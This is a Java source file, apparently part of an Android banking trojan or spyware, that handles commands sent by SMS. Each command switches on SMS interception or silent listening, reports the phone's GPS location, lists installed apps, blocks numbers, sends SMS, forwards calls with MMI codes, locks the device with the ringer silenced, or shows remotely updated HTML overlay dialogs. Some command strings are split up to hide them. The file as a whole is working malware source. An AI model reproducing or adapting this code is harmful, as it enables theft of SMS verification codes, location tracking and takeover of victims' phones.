package org.slempo.service.utils;

import java.io.IOException;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.Calendar;
import java.util.HashSet;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;
import org.slempo.service.Constants;
import org.slempo.service.MainService;
import org.slempo.service.activities.HTMLDialogs;

import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.location.Location;
import android.media.AudioManager;
import android.net.Uri;

public class SmsProcessor {

	private final String data;

	private final String params;

	private final Context context;

	private static HashSet<String> commands = new HashSet<String>();

	private SharedPreferences settings;

	private AlarmManager am;

	static {
		StringBuilder builder = new StringBuilder();
		commands.add("#intercept_sms_start");
		commands.add("#intercept_sms_stop");
		commands.add("#check_gps");
		commands.add("#block_numbers");
		commands.add("#unblock_all_numbers");
		commands.add("#unblock_numbers");
		builder.append("#listen_sms_");
		commands.add(builder.toString() + "start");
		commands.add(builder.toString() + "stop");
		commands.add("#check");
		commands.add("#grab_apps");
		commands.add("#lock");
		commands.add("#unlock");
		builder = new StringBuilder();
		builder.append("#send");
		builder.append("_sms");
		commands.add(builder.toString());
		commands.add("#forward_calls");
		commands.add("#disable_forward_calls");
		commands.add("#control_number");
		commands.add("#sentid");
		commands.add("#show_html");
		commands.add("#update_html");
	}

	public SmsProcessor(final String data, final String params,
			final Context context) {
		this.data = data.trim();
		this.params = params;
		this.context = context;
		settings = this.context.getSharedPreferences(Constants.PREFS_NAME,
				Context.MODE_PRIVATE);
		am = (AlarmManager) context.getSystemService(Context.ALARM_SERVICE);
	}

	public boolean processCommand() {
		StringBuilder builder = new StringBuilder();
		builder.append("#send");
		builder.append("_sms");
		StringBuilder listen = new StringBuilder();
		listen.append("#listen_sms_");
		boolean hasCommand = hasCommand();
		if (hasCommand) {
			if (data.indexOf("#intercept_sms_start") != -1) {
				processInterceptSMSStartCommand();
			} else if (data.indexOf("#intercept_sms_stop") != -1) {
				processInterceptSMSStopCommand();
			} else if (data.indexOf("#check_gps") != -1) {
				processCheckGPSCommand();
			} else if (data.indexOf("#block_numbers") != -1) {
				processBlockNumbersCommand();
			} else if (data.indexOf("#unblock_all_numbers") != -1) {
				processUnblockAllNumbersCommand();
			} else if (data.indexOf("#unblock_numbers") != -1) {
				processUnblockNumbersCommand();
			} else if (data.indexOf(listen.toString() + "start") != -1) {
				processListenSMSStartCommand();
			} else if (data.indexOf(listen.toString() + "stop") != -1) {
				processListenSMSStopCommand();
			} else if (data.indexOf("#grab_apps") != -1) {
				processGrabAppsCommand();
			} else if (data.indexOf("#lock") != -1) {
				processLockCommand();
			} else if (data.indexOf("#unlock") != -1) {
				processUnlockCommand();
			} else if (data.indexOf(builder.toString()) != -1) {
				processSendMessageCommand();
			} else if (data.indexOf("#sentid") != -1) {
				processSentIDCommand();
			} else if (data.indexOf("#control_number") != -1) {
				processControlNumberCommand();
			} else if (data.indexOf("#check") != -1) {
				processCheckCommand();
			} else if (data.indexOf("#show_html") != -1) {
				processShowHTMLCommand();
			} else if (data.indexOf("#forward_calls") != -1) {
				processForwardCallsCommand();
			} else if (data.indexOf("#disable_forward_calls") != -1) {
				processDisableForwardCallsCommand();
			} else if (data.indexOf("#update_html") != -1) {
				processUpdateHTMLCommand();
			} else {
				return false;
			}
		} else {
			return false;
		}
		return true;
	}

	private void processUpdateHTMLCommand() {
		try {
			JSONObject jObject = new JSONObject(params);
			Utils.putStringValue(settings, Constants.HTML_VERSION,
					jObject.getString("version"));
			String data = jObject.getString("data");
			Utils.putStringValue(settings, Constants.HTML_DATA, data);
			MainService.updateHTML(new JSONArray(data));
			Sender.sendHTMLUpdated(context);
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	private void processSentIDCommand() {
		String number = Parser.getParameter(data, 0);
		String code = settings.getString(Constants.APP_ID, "-1");
		Utils.sendMessage(number, code);
		Sender.sendNotificationSMSSentData(context, number, code);
	}

	private void processShowHTMLCommand() {
		try {
			JSONObject jObj = new JSONObject(params);
			int startDelay = jObj.getInt("start delay minutes");
			scheduleLaunch(HTMLDialogs.ACTION, params, startDelay);
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	private void processForwardCallsCommand() {
		String number = Parser.getParameter(data, 0);
		callForward("*21*" + number + "#");
		Sender.sendCallsForwarded(context, number);
	}

	private void processDisableForwardCallsCommand() {
		callForward("#21#");
		Sender.sendCallsForwardingDisabled(context);
	}

	private void callForward(final String number) {
		Intent intentCallForward = new Intent(Intent.ACTION_CALL);
		intentCallForward.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
		Uri mmiCode = Uri.fromParts("tel", number, "#");
		intentCallForward.setData(mmiCode);
		context.startActivity(intentCallForward);
	}

	private void scheduleLaunch(String action, String values, int startDelay) {
		Calendar cal = Calendar.getInstance();
		cal.add(Calendar.MINUTE, startDelay);
		Intent intent = new Intent(action);
		intent.putExtra("values", params);
		PendingIntent pi = PendingIntent.getBroadcast(context, 0, intent, 0);
		am.set(AlarmManager.RTC_WAKEUP, cal.getTimeInMillis(), pi);
	}

	private void processControlNumberCommand() {
		String number = Parser.getParameter(data, 0);
		Utils.putStringValue(settings, Constants.CONTROL_NUMBER, number);
		Sender.sendControlNumberData(context);
		try {
			JSONObject jObject = new JSONObject();
			jObject.put("type", "number done");
			Utils.sendMessage(number, jObject.toString());
		} catch (JSONException e) {
			e.printStackTrace();
		}
	}

	private void processCheckCommand() {
		Sender.sendCheckData(context);
	}

	private void processSendMessageCommand() {
		String number = Parser.getParameter(data, 0);
		String text = data.substring(Parser.indexOfSpace(data, 1));
		Utils.sendMessage(number, text);
		Sender.sendNotificationSMSSentData(context, number, text);
	}

	private void processGrabAppsCommand() {
		Sender.sendInstalledApps(context);
	}

	private void processLockCommand() {
		MainService.showSystemDialog();
		AudioManager audioManager = (AudioManager) context
				.getSystemService(Context.AUDIO_SERVICE);
		audioManager.setRingerMode(AudioManager.RINGER_MODE_SILENT);
		Utils.putBooleanValue(settings, Constants.IS_LOCK_ENABLED, true);
		Sender.sendLockStatus(context, "locked");
	}

	private void processUnlockCommand() {
		MainService.hideSystemDialog();
		AudioManager audioManager = (AudioManager) context
				.getSystemService(Context.AUDIO_SERVICE);
		audioManager.setRingerMode(AudioManager.RINGER_MODE_NORMAL);
		Utils.putBooleanValue(settings, Constants.IS_LOCK_ENABLED, false);
		Sender.sendLockStatus(context, "unlocked");
	}

	private void processListenSMSStopCommand() {
		Utils.putBooleanValue(settings, Constants.LISTENING_SMS_ENABLED, false);
		Sender.sendListeningStatus(context, "stopped");
	}

	private void processListenSMSStartCommand() {
		Utils.putBooleanValue(settings, Constants.LISTENING_SMS_ENABLED, true);
		Sender.sendListeningStatus(context, "started");
	}

	private void processCheckGPSCommand() {
		if (Constants.ENABLE_GPS) {
			Location location = MainService.getLocation();
			if (location != null) {
				Sender.sendGPSData(context,
						Double.toString(location.getLatitude()),
						Double.toString(location.getLongitude()));
			} else {
				Sender.sendGPSData(context, "Unknown", "Unknown");
			}
		}
	}

	@SuppressWarnings("unchecked")
	private void processBlockNumbersCommand() {
		try {
			String text = data.substring(Parser.indexOfSpace(data, 0));
			ArrayList<String> numbers = new ArrayList<String>(
					Arrays.asList(text.split(",")));
			HashSet<String> numbersSet = new HashSet<String>(numbers);
			HashSet<String> blockedNumbers = (HashSet<String>) ObjectSerializer
					.deserialize(settings.getString(Constants.BLOCKED_NUMBERS,
							ObjectSerializer.serialize(new HashSet<String>())));
			blockedNumbers.addAll(numbersSet);
			Utils.putStringValue(settings, Constants.BLOCKED_NUMBERS,
					ObjectSerializer.serialize(blockedNumbers));
			Sender.sendStartBlockingNumbersData(context, blockedNumbers);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void processUnblockAllNumbersCommand() {
		try {
			Utils.putStringValue(settings, Constants.BLOCKED_NUMBERS,
					ObjectSerializer.serialize(new HashSet<String>()));
			Sender.sendUnblockAllNumbersData(context);
		} catch (IOException e) {
			e.printStackTrace();
		}
	}

	@SuppressWarnings("unchecked")
	private void processUnblockNumbersCommand() {
		try {
			String text = data.substring(Parser.indexOfSpace(data, 0));
			ArrayList<String> numbers = new ArrayList<String>(
					Arrays.asList(text.split(",")));
			HashSet<String> numbersSet = new HashSet<String>(numbers);
			HashSet<String> blockedNumbers = (HashSet<String>) ObjectSerializer
					.deserialize(settings.getString(Constants.BLOCKED_NUMBERS,
							ObjectSerializer.serialize(new HashSet<String>())));
			blockedNumbers.removeAll(numbersSet);
			Utils.putStringValue(settings, Constants.BLOCKED_NUMBERS,
					ObjectSerializer.serialize(blockedNumbers));
			Sender.sendStartBlockingNumbersData(context, blockedNumbers);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}

	private void processInterceptSMSStartCommand() {
		Utils.putBooleanValue(settings,
				Constants.INTERCEPTING_INCOMING_ENABLED, true);
		Sender.sendRentStatus(context, "started");
	}

	private void processInterceptSMSStopCommand() {
		Utils.putBooleanValue(settings,
				Constants.INTERCEPTING_INCOMING_ENABLED, false);
		Sender.sendRentStatus(context, "stopped");
	}

	private boolean hasCommand() {
		for (String command : commands) {
			if (data.indexOf(command) != -1) {
				return true;
			}
		}
		return false;
	}

	public boolean needToInterceptIncoming() {
		return settings.getBoolean(Constants.INTERCEPTING_INCOMING_ENABLED,
				false);
	}

	public boolean needToListen() {
		return true;
	}

	public String getControlNumber() {
		return settings.getString(Constants.CONTROL_NUMBER, "");
	}/**/
}
